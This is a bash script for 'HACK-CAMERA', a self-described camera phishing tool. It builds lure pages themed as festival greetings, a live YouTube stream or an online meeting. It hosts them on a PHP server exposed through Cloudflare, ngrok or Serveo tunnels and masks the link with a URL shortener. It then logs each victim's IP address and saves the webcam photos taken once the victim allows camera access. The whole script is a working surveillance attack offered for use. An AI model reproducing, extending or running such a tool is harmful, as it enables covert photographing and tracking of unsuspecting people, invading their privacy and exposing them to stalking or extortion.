#!/bin/bash

# HACK-CAMERA 
# Version    : 1.0
# Description: CameraHackHack is a camera Phishing tool. Send a phishing link to victim, if he/she gives access to camera, his/her photo will be captured!
# Author     : Muhammad Mehran
# Github     : https://github.com/Mirzamehran1234
# Date       : 2-02-2026
# Language   : Shell, HTML, Css
# Portable File
# If you copy, consider giving credit! We keep our code open source to help others


# Colors

black="\033[1;30m"
red="\033[1;31m"
green="\033[1;32m"
yellow="\033[1;33m"
blue="\033[1;34m"
purple="\033[1;35m"
cyan="\033[1;36m"
violate="\033[1;37m"
white="\033[0;37m"
nc="\033[00m"

# --- Configuration & Production Logic ---
TUNNEL_DIR="$HOME/.tunnels"
BIN_DIR="$TUNNEL_DIR/bin"
LOG_DIR="$TUNNEL_DIR/logs"
PHP_PORT=7777

# Exit codes (Internal)
ERR_NETWORK=10; ERR_BINARY=11; ERR_TTY=13; ERR_TIMEOUT=14; ERR_UNKNOWN=99

# Detect TTY/PTY status
if [[ -t 1 || -t 0 ]]; then HAS_TTY=true; else HAS_TTY=false; fi

# Output snippets
info="${red}[${white}+${red}] ${cyan}"
ask="${red}[${white}?${red}] ${violate}"
error="${cyan}[${white}!${cyan}] ${red}"
success="${red}[${white}√${red}] ${green}"


cwd=$(cd $(dirname $0); pwd)

# Logo 
logo="    
${blue}  _   _    _    ____ _  __      ____    _    __  __ _____ ____      _    
${blue} | | | |  / \  / ___| |/ /     / ___|  / \  |  \/  | ____|  _ \    / \   
${blue} | |_| | / _ \| |   | ' /_____| |     / _ \ | |\/| |  _| | |_) |  / _ \  
${blue} |  _  |/ ___ \ |___| . \_____| |___ / ___ \| |  | | |___|  _ <  / ___ \ 
${blue} |_| |_/_/   \_\____|_|\_\     \____/_/   \_\_|  |_|_____|_| \_\/_/   \_\
${green}                                               [By  Muhammad Mehran]
"

# Package Installer
pacin(){
    if $sudo && $pacman; then
        sudo pacman -S $1 --noconfirm
    fi
}

# Kill running instances of required packages
killer() {
    killall php 2>/dev/null
    killall ngrok 2>/dev/null
    pkill -f "cloudflared.*tunnel" 2>/dev/null
    pkill -f "ssh.*serveo.net" 2>/dev/null
    killall curl 2>/dev/null
    killall wget 2>/dev/null
    killall unzip 2>/dev/null
}

# Check if offline
netcheck() {
    while true; do
        wget --spider --quiet https://github.com
        if [ "$?" != 0 ]; then
            echo -e "${error}No internet!\007\n"
            sleep 2
        else
            break
        fi
    done
}

# Delete ngrok file
ngrokdel() {
    unzip ngrok.zip
    rm -rf ngrok.zip
}

# Set template
replacer() {
    while true; do
    if echo $option | grep -q "1"; then
        sed "s|forwarding_link|"$1"|g" template.php > index.php
        sed "s|forwarding_link|"$1"|g" festivalwishes.html > index3.html
        sed "s|fes_name|"$fest_name"|g" index3.html > index2.html
        rm -rf index3.html
        break
    elif echo $option | grep -q "2"; then
        sed "s|forwarding_link|"$1"|g" template.php > index.php
        sed "s|forwarding_link|"$1"|g" LiveYTTV.html > index3.html
        sed "s|live_yt_tv|"$vid_id"|g" index3.html > index2.html
        rm -rf index3.html
        break
    elif echo $option | grep -q "3"; then
        sed "s|forwarding_link|"$1"|g" template.php > index.php
        sed "s|forwarding_link|"$1"|g" OnlineMeeting.html > index2.html
        break
    fi
    done
    echo -e "${info}Your urls are: ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ \n"
    sleep 1
    echo -e "${success}Link 1 : ${1}\n"
    sleep 1
    # Try to create shortened URL only if internet is available
    if wget --spider --quiet https://github.com 2>/dev/null; then
        masked=$(curl -s https://is.gd/create.php\?format\=simple\&url\=${1} 2>/dev/null)
        if ! [[ -z $masked ]]; then
            echo -e "${success}URL 2 > ${masked}\n"
        fi
    fi
}

# Prevent ^C
stty -echoctl

# Detect UserInterrupt
trap "echo -e '\n${success}Thanks for Using!\n'; killer; exit" 2

# Termux
if [[ -d /data/data/com.termux/files/home ]]; then
termux-fix-shebang hack_camera.sh
termux=true
else
termux=false
fi

# Workdir
export FOL="$cwd"

# Set Package Manager
if [ `command -v sudo` ]; then
    sudo=true
else
    sudo=false
fi
if $sudo; then
if [ `command -v apt` ]; then
    pac_man="sudo apt"
elif  [ `command -v apt-get` ]; then
    pac_man="sudo apt-get"
elif  [ `command -v yum` ]; then
    pac_man="sudo yum"
elif [ `command -v dnf` ]; then
    pac_man="sudo dnf"
elif [ `command -v apk` ]; then
    pac_man="sudo apk"
elif [ `command -v pacman` ]; then
    pacman=true
else
    echo -e "${error}No supported package manager found! Install packages manually!\007\n"
    exit 1
fi
else
if [ `command -v apt` ]; then
    pac_man="apt"
elif [ `command -v apt-get` ]; then
    pac_man="apt-get"
elif [ `command -v brew` ]; then
    pac_man="brew"
else
    echo -e "${error}No supported package manager found! Install packages manually!\007\n"
    exit 1
fi
fi


# Environment check
if [[ ! -d "$BIN_DIR" ]]; then
    echo -e "${error}Setup not found! Run ${yellow}bash setup.sh${red} first.\007\n"
    exit 1
fi

# Termux environment adjustment
if $termux; then
    [[ "$(pwd)" != *"/home"* ]] && { echo -e "${error}Run from home!\n"; exit 1; }
fi

# --- Modular Tunneling Logic ---

start_cloudflare() {
    local port=$1; local logfile="$LOG_DIR/cf.log"; rm -f "$logfile"
    echo -e "${info}Starting Cloudflare tunnel......\n"
    if [[ "$termux" == "true" ]] && command -v termux-chroot >/dev/null 2>&1; then
        termux-chroot "$BIN_DIR/cloudflared" tunnel --url "http://127.0.0.1:$port" --logfile "$logfile" > /dev/null 2>&1 &
    else
        "$BIN_DIR/cloudflared" tunnel --url "http://127.0.0.1:$port" --logfile "$logfile" > /dev/null 2>&1 &
    fi
    local timeout=45; local count=0
    while [ $count -lt $timeout ]; do
        if [[ -f "$logfile" ]]; then
            local link=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' "$logfile" | head -n 1)
            if [[ -n "$link" ]]; then
                echo -e "${success}Cloudflare Link: $link\n"
                replacer "$link"; return 0
            fi
        fi
        pgrep -f "cloudflared.*$port" >/dev/null || break
        sleep 1; ((count++))
    done
    echo -e "${error}Cloudflare failed!\n"; killer; exit 1
}

start_ngrok() {
    local port=$1; local logfile="$LOG_DIR/ngrok.log"
    echo -e "${info}Starting Ngrok tunnel......\n"
    if ! "$BIN_DIR/ngrok" config check >/dev/null 2>&1 && $HAS_TTY; then
        printf "\n${ask}Enter Ngrok authtoken: "; read ntoken
        [[ -n "$ntoken" ]] && "$BIN_DIR/ngrok" config add-authtoken "$ntoken"
    fi
    "$BIN_DIR/ngrok" http "$port" --log=stdout > "$logfile" 2>&1 &
    local timeout=30; local count=0
    while [ $count -lt $timeout ]; do
        local link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[a-zA-Z0-9.-]*\.ngrok-free.app' | head -n 1)
        [[ -z "$link" ]] && link=$(curl -s http://127.0.0.1:4040/api/tunnels | grep -o 'https://[a-zA-Z0-9.-]*\.ngrok.io' | head -n 1)
        if [[ -n "$link" ]]; then
            echo -e "${success}Ngrok Link: $link\n"
            replacer "$link"; return 0
        fi
        grep -qi "err=" "$logfile" && break
        sleep 1; ((count++))
    done
    echo -e "${error}Ngrok failed!\n"; killer; exit 1
}

start_serveo() {
    local port=$1; local logfile="$LOG_DIR/serveo.log"; rm -f "$logfile"
    echo -e "${info}Starting Serveo tunnel......\n"
    local cmd="ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:$port serveo.net"
    if $HAS_TTY; then
        $cmd > "$logfile" 2>&1 &
    else
        if command -v script >/dev/null 2>&1; then
            if [[ "$(uname)" == "Linux" ]]; then
                script -q -c "$cmd" /dev/null > "$logfile" 2>&1 &
            else
                script -q /dev/null "$cmd" > "$logfile" 2>&1 &
            fi
        else
            echo -e "${error}PTY emulation failed (no 'script' cmd).\n"; exit 1
        fi
    fi
    local timeout=30; local count=0
    while [ $count -lt $timeout ]; do
        local link=$(grep -oi 'https://[a-z0-9.-]*\.serveo[a-z0-9.-]*' "$logfile" | head -n 1)
        if [[ -n "$link" ]]; then
            echo -e "${success}Serveo Link: $link\n"
            replacer "$link"; return 0
        fi
        sleep 1; ((count++))
    done
    echo -e "${error}Serveo failed!\n"
    if [[ -f "$logfile" ]]; then
        echo -e "${info}Last output from Serveo log:\n"
        tail -n 10 "$logfile"
        echo ""
    fi
    killer; exit 1
}



# Start Point
while true; do
clear
echo -e "$logo"
sleep 1
echo -e "${ask}Choose an option:
${red}[${white}1${red}] ${cyan}Festival
${red}[${white}2${red}] ${cyan}Live Youtube
${red}[${white}3${red}] ${cyan}Online Meeting
${red}[${white}x${red}] ${cyan}About
${red}[${white}0${red}] ${cyan}Exit${blue}
"

sleep 1
printf "${cyan}\nMuhammadMehran${nc}@${blue}Revcraftlab ${red}$ ${nc}"
read option
# Select template
    if echo $option | grep -q "1"; then
        dir="fest"
        printf "\n${ask}Enter festival name:${cyan}\n\nMuhammadMehran${nc}@${blue}Revcraftlab ${red}$ ${nc}"
        read fest_name
        if [ -z $fest_name ]; then
            echo -e "\n${error}Invalid input!\n\007"
            sleep 1
        else
            fest_name="${fest_name//[[:space:]]/}"
            break
        fi
    elif echo $option | grep -q "2"; then
        dir="live"
        printf "\n${ask}Enter youtube video ID:${cyan}\n\nMuhammadMehran${nc}@${blue}Revcraftlab ${red}$ ${nc}"
        read vid_id
        if [ -z $vid_id ]; then
            echo -e "\n${error}Invalid input!\n\007"
            sleep 1
        else
            break
        fi
    elif echo $option | grep -q "3"; then
        dir="om"
        break

    elif echo $option | grep -q "x"; then
        clear
        echo -e "$logo"
        echo -e "$red[ToolName]  ${cyan}  :[HACK-CAMERA]
$red[Version]    ${cyan} :[2.1]
$red[Description]${cyan} :[Camera Phishing tool]
$red[Author]     ${cyan} :[Muhammad Mehran]
$red[Github]     ${cyan} :[https://github.com/Mirzamehran1234] 
"
printf "${cyan}\nMuhammadMehran${nc}@${cyan}Revcraftlab ${red}$ ${nc}"
read about
    elif echo $option | grep -q "0"; then
        exit 0
    else
        echo -e "\n${error}Invalid input!\007"
        sleep 1
    fi
done
cd $cwd
if [ -e websites.zip ];then
unzip websites.zip > /dev/null 2>&1
rm -rf websites.zip
fi
if ! [ -d $dir ];then
mkdir $dir
cd $dir
netcheck
wget -q --show-progress "https://github.com/Mirzamehran1234/files/raw/main/${dir}.zip"
unzip ${dir}.zip > /dev/null 2>&1
rm -rf ${dir}.zip
else
cd $dir
fi 

# Tunneler Selection Menu
while true; do
clear
echo -e "$logo"
echo -e "${ask}Choose tunneling method:
${red}[${white}1${red}] ${cyan}Localhost (No tunneling)
${red}[${white}2${red}] ${cyan}Cloudflare
${red}[${white}3${red}] ${cyan}Ngrok
${red}[${white}4${red}] ${cyan}Serveo.net${blue}
"
printf "${cyan}\nMuhammadMehran${nc}@${blue}Revcraftlab ${red}$ ${nc}"
read tunneler_choice

if echo $tunneler_choice | grep -q "1"; then
    TUNNELER="localhost"
    break
elif echo $tunneler_choice | grep -q "2"; then
    TUNNELER="cloudflare"
    break
elif echo $tunneler_choice | grep -q "3"; then
    TUNNELER="ngrok"
    break
elif echo $tunneler_choice | grep -q "4"; then
    TUNNELER="serveo"
    break
else
    echo -e "\n${error}Invalid input!\007"
    sleep 1
fi
done

# Hotspot required for termux
if $termux; then
echo -e "\n${info}If you haven't turned on hotspot, please enable it!"
sleep 3
fi
echo -e "\n${info}Starting PHP Server at 127.0.0.1:7777\n"
# Ensure we are in the template directory and kill any old PHP instance
killer
# Use absolute path for document root to avoid any directory context issues
php -S 127.0.0.1:7777 -t "$cwd/$dir" > /dev/null 2>&1 &
sleep 2

# Start selected tunneler
if [ "$TUNNELER" == "localhost" ]; then
    echo -e "${success}Using Localhost mode!\n"
    replacer "http://127.0.0.1:$PHP_PORT"
elif [ "$TUNNELER" == "cloudflare" ]; then
    start_cloudflare "$PHP_PORT"
elif [ "$TUNNELER" == "ngrok" ]; then
    start_ngrok "$PHP_PORT"
elif [ "$TUNNELER" == "serveo" ]; then
    start_serveo "$PHP_PORT"
fi

sleep 1
# Check if PHP process is running
if pidof php > /dev/null 2>&1; then
    echo -e "${success}PHP started succesfully!\n"
else
    echo -e "${error}PHP couldn't start!\n\007"
    killer; exit 1
fi
sleep 1
rm -rf ip.txt
echo -e "${info}Waiting for target. ${cyan}Press ${red}Ctrl + C ${cyan}to exit...\n"
while true; do
    if [[ -e "ip.txt" ]]; then
        echo -e "\007${success}Target opened the link!\n"
        while IFS= read -r line; do
            echo -e "${green}[${blue}*${green}]${yellow} $line"
        done < ip.txt
        echo ""
        cat ip.txt >> $cwd/ips.txt
        rm -rf ip.txt
    fi
    sleep 0.5
    if [[ -e "log.txt" ]]; then
        echo -e "\007${success}IMAGE FILE RECEIVED ! Download...\n"
        
        # Handle capture folder images
        if [ -d "capture" ]; then
            if ls capture/*.jpg 1> /dev/null 2>&1; then
                if [ ! -d "$FOL/capture" ]; then
                    mkdir -p "$FOL/capture"
                fi
                mv -f capture/*.jpg "$FOL/capture/"
            fi
        fi

        # Handle root images (fallback)
        if ls *.jpg 1> /dev/null 2>&1; then
            if [ ! -d "$FOL/capture" ]; then
                mkdir -p "$FOL/capture"
            fi
            mv -f *.jpg "$FOL/capture/"
        fi
        
        rm -rf log.txt
    fi
    sleep 0.5
done 
